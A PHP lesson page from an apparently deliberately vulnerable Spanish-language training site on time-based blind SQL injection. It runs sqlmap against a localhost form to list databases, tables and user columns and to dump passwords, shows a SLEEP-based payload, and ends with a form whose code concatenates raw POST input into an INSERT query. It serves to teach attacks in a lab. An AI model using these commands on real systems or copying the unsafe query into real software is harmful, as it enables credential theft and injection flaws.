<?php include("../../header.php"); ?>

<title>Time-Based SQL Injection</title>

<section id="template">
      <div class="container">
        <div class="row"> 
          <div class="col-md-12">
            <h3 class="title text-center">Time-Based SQL Injection</h3>
            <div class="titleHR"><span></span></div>
          </div>
        </div>

        <p>Existen otros tipos de inyecciones pero una de las otras mas comunes es las que se basan en el tiempo, estas lo que hacen es inyectar consultas sql como en la anterior pero basandose en inyectar una consulta basada en tiempo dependiendo de si la respuesta es verdadera o no.</p>

        <p>Su explotacion no es dificil sabiendo que consultas inyectar y que parametros hacer para dar una respuesta. En este caso al ser un ataque de tiempo se puede hacer uso de un script para ejecutar peticiones y medir el tiempo entre la respuesta y la solicitud.</p>

        <p>Para repetir el paso como en la anterior explotacion de sqli basico, se debe de enteder como funciona y los pasos a seguir y para automatizar la explotacion se hara uso de sqlmap y su sintaxis para poder extraer datos de la base de datos.</p>

        <h2>Pasos a seguir con sqlmap:</h2>

        <h3>Listar las base de datos:</h3>

        <ul>
          <li>--forms: Indica que se hara el ataque por medio de un form y verificara si es vulnerable</li>
          <li>--dbms: Indica el gestor de base de datos que se esta utilizando, en este caso es un mysql</li>
          <li>--risk: Indica el nivel de riesgo para hacer la inyeccion, del 1 al 3, siendo 3 el mas alto y 1 el mas bajo</li>
          <li>--level: Indica el nivel de ataque que se hara, del 1 al 5, siendo 5 el mas agresivo el nivel del ataque</li>
          <li>--batch: Evita aceptar los valores que sqlmap pide confirmacion</li>
          <li>--dbs: Parametro para listar las bases de datos</li>
        </ul>

        <pre>sqlmap -u http&colon;&sol;&sol;localhost&sol;vistas&sol;vulnerabilidades&sol;injection&sol;timebased&period;php --forms --dbms&equals;mysql --dbs --risk&equals;3 --level&equals;5 --batch -v&NewLine;&NewLine;&lsqb;10&colon;02&colon;50&rsqb; &lsqb;INFO&rsqb; the back-end DBMS is MySQL&NewLine;web server operating system&colon; Linux Debian 8 &lpar;jessie&rpar;&NewLine;web application technology&colon; Apache 2&period;4&period;10&comma; PHP 7&period;0&period;0&NewLine;back-end DBMS&colon; MySQL &gt;&equals; 5&period;0&period;0&NewLine;&lsqb;10&colon;02&colon;50&rsqb; &lsqb;INFO&rsqb; fetching database names&NewLine;&lsqb;10&colon;02&colon;50&rsqb; &lsqb;INFO&rsqb; fetching number of databases&NewLine;&lsqb;10&colon;02&colon;50&rsqb; &lsqb;INFO&rsqb; retrieved&colon; 5&NewLine;&lsqb;10&colon;02&colon;52&rsqb; &lsqb;INFO&rsqb; retrieved&colon; information&lowbar;schema&NewLine;&lsqb;10&colon;03&colon;51&rsqb; &lsqb;INFO&rsqb; retrieved&colon; mysql&NewLine;&lsqb;10&colon;04&colon;08&rsqb; &lsqb;INFO&rsqb; retrieved&colon; performance&lowbar;schema&NewLine;&lsqb;10&colon;05&colon;04&rsqb; &lsqb;INFO&rsqb; retrieved&colon; proyecto&NewLine;&lsqb;10&colon;05&colon;33&rsqb; &lsqb;INFO&rsqb; retrieved&colon; sys&NewLine;available databases &lsqb;5&rsqb;&colon;&NewLine;&lsqb;&ast;&rsqb; information&lowbar;schema&NewLine;&lsqb;&ast;&rsqb; mysql&NewLine;&lsqb;&ast;&rsqb; performance&lowbar;schema&NewLine;&lsqb;&ast;&rsqb; proyecto&NewLine;&lsqb;&ast;&rsqb; sys</pre>

        <h3>Listas tablas de la base de datos</h3>

        <ul>
          <li>-D db: Indica la base de datos a utilizar</li>
          <li>--tables: Listara las tablas de la base de datos indicada</li>
        </ul>

        <pre>sqlmap -u http&colon;&sol;&sol;localhost&sol;vistas&sol;vulnerabilidades&sol;injection&sol;timebased&period;php --forms --dbms&equals;mysql -D proyecto --tables --risk&equals;3 --level&equals;5 --batch -v&NewLine;&NewLine;sqlmap resumed the following injection point&lpar;s&rpar; from stored session&colon;&NewLine;---&NewLine;Parameter&colon; username &lpar;POST&rpar;&NewLine;    Type&colon; time-based blind&NewLine;    Title&colon; MySQL &gt;&equals; 5&period;0&period;12 RLIKE time-based blind&NewLine;    Payload&colon; username&equals;LyEd&apos; RLIKE SLEEP&lpar;5&rpar; AND &apos;qoKp&apos;&equals;&apos;qoKp&amp;password&equals;&NewLine;---&NewLine;do you want to exploit this SQL injection&quest; &lsqb;Y&sol;n&rsqb; Y&NewLine;&lsqb;10&colon;41&colon;22&rsqb; &lsqb;INFO&rsqb; testing MySQL&NewLine;&lsqb;10&colon;41&colon;22&rsqb; &lsqb;INFO&rsqb; confirming MySQL&NewLine;&lsqb;10&colon;41&colon;22&rsqb; &lsqb;INFO&rsqb; the back-end DBMS is MySQL&NewLine;web server operating system&colon; Linux Debian 8 &lpar;jessie&rpar;&NewLine;web application technology&colon; Apache 2&period;4&period;10&comma; PHP 7&period;0&period;0&NewLine;back-end DBMS&colon; MySQL &gt;&equals; 5&period;0&period;0&NewLine;&lsqb;10&colon;41&colon;22&rsqb; &lsqb;INFO&rsqb; fetching tables for database&colon; &apos;proyecto&apos;&NewLine;&lsqb;10&colon;41&colon;22&rsqb; &lsqb;INFO&rsqb; fetching number of tables for database &apos;proyecto&apos;&NewLine;&lsqb;10&colon;41&colon;22&rsqb; &lsqb;WARNING&rsqb; time-based comparison requires larger statistical model&comma; please wait&period;&period;&period;&period;&period;&period;&period;&period;&period;&period;&period;&period;&period;&period;&period;&period;&period;&period;&period;&period;&period;&period;&period;&period;&period;&period;&period;&period;&period;&period; &lpar;done&rpar;&NewLine;&lsqb;10&colon;41&colon;23&rsqb; &lsqb;WARNING&rsqb; it is very important to not stress the network connection during usage of time-based payloads to prevent potential disruptions&NewLine;do you want sqlmap to try to optimize value&lpar;s&rpar; for DBMS delay responses &lpar;option &apos;--time-sec&apos;&rpar;&quest; &lsqb;Y&sol;n&rsqb; Y&NewLine;&lsqb;10&colon;41&colon;38&rsqb; &lsqb;INFO&rsqb; adjusting time delay to 1 second due to good response times&NewLine;3&NewLine;&lsqb;10&colon;41&colon;38&rsqb; &lsqb;INFO&rsqb; retrieved&colon; comentarios&NewLine;&lsqb;10&colon;42&colon;12&rsqb; &lsqb;INFO&rsqb; retrieved&colon; products&NewLine;&lsqb;10&colon;42&colon;41&rsqb; &lsqb;INFO&rsqb; retrieved&colon; users&NewLine;Database&colon; proyecto&NewLine;&lsqb;3 tables&rsqb;&NewLine;&plus;-------------&plus;&NewLine;&verbar; comentarios &verbar;&NewLine;&verbar; products    &verbar;&NewLine;&verbar; users       &verbar;&NewLine;&plus;-------------&plus;</pre>

        <h3>Listas la columnas de las tablas</h3>

        <ul>
          <li>-T tabla: Indica la tabla que se extraera las columnas</li>
          <li>--columns: Lista las columnas de la tabla</li>
        </ul>

        <pre>sqlmap -u http&colon;&sol;&sol;localhost&sol;vistas&sol;vulnerabilidades&sol;injection&sol;timebased&period;php --forms --dbms&equals;mysql -D proyecto -T users --columns --risk&equals;3 --level&equals;5 --batch -v&NewLine;&NewLine;sqlmap resumed the following injection point&lpar;s&rpar; from stored session&colon;&NewLine;---&NewLine;Parameter&colon; username &lpar;POST&rpar;&NewLine;    Type&colon; time-based blind&NewLine;    Title&colon; MySQL &gt;&equals; 5&period;0&period;12 RLIKE time-based blind&NewLine;    Payload&colon; username&equals;LyEd&apos; RLIKE SLEEP&lpar;5&rpar; AND &apos;qoKp&apos;&equals;&apos;qoKp&amp;password&equals;&NewLine;---&NewLine;do you want to exploit this SQL injection&quest; &lsqb;Y&sol;n&rsqb; Y&NewLine;&lsqb;10&colon;44&colon;35&rsqb; &lsqb;INFO&rsqb; testing MySQL&NewLine;&lsqb;10&colon;44&colon;35&rsqb; &lsqb;INFO&rsqb; confirming MySQL&NewLine;&lsqb;10&colon;44&colon;35&rsqb; &lsqb;INFO&rsqb; the back-end DBMS is MySQL&NewLine;web server operating system&colon; Linux Debian 8 &lpar;jessie&rpar;&NewLine;web application technology&colon; PHP 7&period;0&period;0&comma; Apache 2&period;4&period;10&NewLine;back-end DBMS&colon; MySQL &gt;&equals; 5&period;0&period;0&NewLine;&lsqb;10&colon;44&colon;35&rsqb; &lsqb;INFO&rsqb; fetching columns for table &apos;users&apos; in database &apos;proyecto&apos;&NewLine;&lsqb;10&colon;44&colon;35&rsqb; &lsqb;WARNING&rsqb; time-based comparison requires larger statistical model&comma; please wait&period;&period;&period;&period;&period;&period;&period;&period;&period;&period;&period;&period;&period;&period;&period;&period;&period;&period;&period;&period;&period;&period;&period;&period;&period;&period;&period;&period;&period;&period; &lpar;done&rpar;&NewLine;do you want sqlmap to try to optimize value&lpar;s&rpar; for DBMS delay responses &lpar;option &apos;--time-sec&apos;&rpar;&quest; &lsqb;Y&sol;n&rsqb; Y&NewLine;&lsqb;10&colon;44&colon;41&rsqb; &lsqb;WARNING&rsqb; it is very important to not stress the network connection during usage of time-based payloads to prevent potential disruptions&NewLine;4&NewLine;&lsqb;10&colon;44&colon;41&rsqb; &lsqb;INFO&rsqb; retrieved&colon;&NewLine;&lsqb;10&colon;44&colon;51&rsqb; &lsqb;INFO&rsqb; adjusting time delay to 1 second due to good response times&NewLine;id&NewLine;&lsqb;10&colon;44&colon;55&rsqb; &lsqb;INFO&rsqb; retrieved&colon; int&lpar;11&rpar;&NewLine;&lsqb;10&colon;45&colon;22&rsqb; &lsqb;INFO&rsqb; retrieved&colon; name&NewLine;&lsqb;10&colon;45&colon;34&rsqb; &lsqb;INFO&rsqb; retrieved&colon; varchar&lpar;100&rpar;&NewLine;&lsqb;10&colon;46&colon;09&rsqb; &lsqb;INFO&rsqb; retrieved&colon; password&NewLine;&lsqb;10&colon;46&colon;37&rsqb; &lsqb;INFO&rsqb; retrieved&colon; varchar&lpar;100&rpar;&NewLine;&lsqb;10&colon;47&colon;13&rsqb; &lsqb;INFO&rsqb; retrieved&colon; isAdmin&NewLine;&lsqb;10&colon;47&colon;37&rsqb; &lsqb;INFO&rsqb; retrieved&colon; tinyint&lpar;1&rpar;&NewLine;Database&colon; proyecto&NewLine;Table&colon; users&NewLine;&lsqb;4 columns&rsqb;&NewLine;&plus;----------&plus;--------------&plus;&NewLine;&verbar; Column   &verbar; Type         &verbar;&NewLine;&plus;----------&plus;--------------&plus;&NewLine;&verbar; id       &verbar; int&lpar;11&rpar;      &verbar;&NewLine;&verbar; isAdmin  &verbar; tinyint&lpar;1&rpar;   &verbar;&NewLine;&verbar; name     &verbar; varchar&lpar;100&rpar; &verbar;&NewLine;&verbar; password &verbar; varchar&lpar;100&rpar; &verbar;&NewLine;&plus;----------&plus;--------------&plus;</pre>

        <h3>Tomar los datos de las columnas</h3>

        <p>Ahora lanzar el comando para dumpear los datos de las columnas</p>

        <pre>sqlmap -u http&colon;&sol;&sol;localhost&sol;vistas&sol;vulnerabilidades&sol;injection&sol;timebased&period;php --forms --dbms&equals;mysql -D proyecto -T users -C username&comma; password --dump --risk&equals;3 --level&equals;5 --batch -v</pre>

        <hr>
        <h1>Ejemplo</h1>

        <div class="login">
            <div class="account-login">
               <h1>Crear usuario</h1>
               <form action="<?php echo $_SERVER["PHP_SELF"]; ?>" class="login-form" method="post">
                  <div class="form-group">
                     <input type="text" placeholder="Usuario" class="form-control" name="username">
                  </div>
                  <div class="form-group">
                     <input type="password" placeholder="Contrasena"  class="form-control" name="password">
                  </div>
                  <input type="submit" class="btn" value="Crear">
               </form>
            </div>
        </div>

<?php
  if (isset($_POST['username']) && isset($_POST['password'])){
      
    require "connection.php";

    $var_consulta= "insert into users(name,password,isAdmin) values('".$_POST["username"]."','".$_POST["password"]."',false);";
    $var_resultado = $obj_conexion->query($var_consulta);
    
    echo "<br>";
    echo "<div class=\"alert alert-success\" role=\"alert\">Tu consulta sql es: <br><strong>$var_consulta</strong></div>";
  }
?>

    </div> <!--/.container -->
    </section> <!--/.container
    

<?php include("../../footer.php"); ?>